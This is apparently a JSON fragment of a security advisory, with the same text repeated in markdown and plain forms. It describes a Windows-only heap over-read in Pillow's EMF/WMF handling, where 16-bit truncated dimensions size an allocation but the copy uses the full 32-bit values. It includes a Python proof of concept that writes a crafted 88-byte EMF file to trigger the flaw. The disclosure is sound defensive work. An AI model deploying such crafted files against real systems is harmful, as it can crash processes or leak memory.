              "fullDescription": {
                "markdown": "### Summary\nOn Windows builds, Pillow stores EMF and WMF image dimensions without a range check and passes them to the native `drawwmf` handler. That code sizes its allocation from dimensions truncated into 16-bit header fields but copies the result using the full 32-bit dimensions. A crafted metafile that is wide and short passes the decompression-bomb pixel check yet causes a heap over-read.\n\n### Details\nThe EMF branch computes the size straight from signed 32-bit header fields and stores it with no positivity or range check:\n\n- `src/PIL/WmfImagePlugin.py:121-129` reads the bounding box; `:148` stores it; the size reaches the native handler through `src/PIL/WmfImagePlugin.py:56`.\n\nIn the native handler the DIB header fields `bcWidth` and `bcHeight` are 16-bit and truncate the allocation, while the copy length uses the untruncated ints:\n\n- `src/display.c:793-794` assign the 16-bit fields\n- `src/display.c:800` sizes the allocation from them\n- `src/display.c:827` copies `height * ((width * 3 + 3) \u0026 -4)` bytes using the full values\n\nThe whole handler is compiled only on Windows (`#ifdef _WIN32`, `src/display.c:33-841`).\n\n### PoC\n```python\nimport struct\nfrom PIL import Image\n\ndef L(v):\n    return struct.pack(\"\u003ci\", v)\n\n# Minimal EMF header. Bounding box is 70000 x 1, so the pixel count (70000) passes the\n# decompression-bomb check, but the width truncates to 16 bits for the allocation while\n# the copy uses 70000.\nemf  = b\"\\x01\\x00\\x00\\x00\" + L(88)          # record type + size\nemf += L(0) + L(0) + L(70000) + L(1)        # rclBounds: x0, y0, x1, y1\nemf += L(0) + L(0) + L(100) + L(100)        # rclFrame (non-zero, used for the dpi calc)\nemf += b\" EMF\"                              # signature at offset 40\nemf += bytes(44)\nopen(\"poc.emf\", \"wb\").write(emf)\n\nim = Image.open(\"poc.emf\")\nprint(\"size:\", im.size, \"pixels:\", im.size[0] * im.size[1])\nim.load()                                   # over-read happens here on a Windows build\n```\n\nOn Linux the first part is observable: the 88-byte file opens, `size` is `(70000, 1)`, and the bomb check passes. The native over-read only exists on Windows because `Image.core.drawwmf` is compiled out elsewhere (on Linux `im.load()` raises `OSError` instead).\n\n### Impact\nCWE-125, out-of-bounds read in a C extension on Windows builds. A crafted EMF or WMF that passes the pixel check can read past a heap buffer, leaking memory or crashing the process.",
                "text": "### Summary\nOn Windows builds, Pillow stores EMF and WMF image dimensions without a range check and passes them to the native `drawwmf` handler. That code sizes its allocation from dimensions truncated into 16-bit header fields but copies the result using the full 32-bit dimensions. A crafted metafile that is wide and short passes the decompression-bomb pixel check yet causes a heap over-read.\n\n### Details\nThe EMF branch computes the size straight from signed 32-bit header fields and stores it with no positivity or range check:\n\n- `src/PIL/WmfImagePlugin.py:121-129` reads the bounding box; `:148` stores it; the size reaches the native handler through `src/PIL/WmfImagePlugin.py:56`.\n\nIn the native handler the DIB header fields `bcWidth` and `bcHeight` are 16-bit and truncate the allocation, while the copy length uses the untruncated ints:\n\n- `src/display.c:793-794` assign the 16-bit fields\n- `src/display.c:800` sizes the allocation from them\n- `src/display.c:827` copies `height * ((width * 3 + 3) \u0026 -4)` bytes using the full values\n\nThe whole handler is compiled only on Windows (`#ifdef _WIN32`, `src/display.c:33-841`).\n\n### PoC\n```python\nimport struct\nfrom PIL import Image\n\ndef L(v):\n    return struct.pack(\"\u003ci\", v)\n\n# Minimal EMF header. Bounding box is 70000 x 1, so the pixel count (70000) passes the\n# decompression-bomb check, but the width truncates to 16 bits for the allocation while\n# the copy uses 70000.\nemf  = b\"\\x01\\x00\\x00\\x00\" + L(88)          # record type + size\nemf += L(0) + L(0) + L(70000) + L(1)        # rclBounds: x0, y0, x1, y1\nemf += L(0) + L(0) + L(100) + L(100)        # rclFrame (non-zero, used for the dpi calc)\nemf += b\" EMF\"                              # signature at offset 40\nemf += bytes(44)\nopen(\"poc.emf\", \"wb\").write(emf)\n\nim = Image.open(\"poc.emf\")\nprint(\"size:\", im.size, \"pixels:\", im.size[0] * im.size[1])\nim.load()                                   # over-read happens here on a Windows build\n```\n\nOn Linux the first part is observable: the 88-byte file opens, `size` is `(70000, 1)`, and the bomb check passes. The native over-read only exists on Windows because `Image.core.drawwmf` is compiled out elsewhere (on Linux `im.load()` raises `OSError` instead).\n\n### Impact\nCWE-125, out-of-bounds read in a C extension on Windows builds. A crafted EMF or WMF that passes the pixel check can read past a heap buffer, leaking memory or crashing the process."
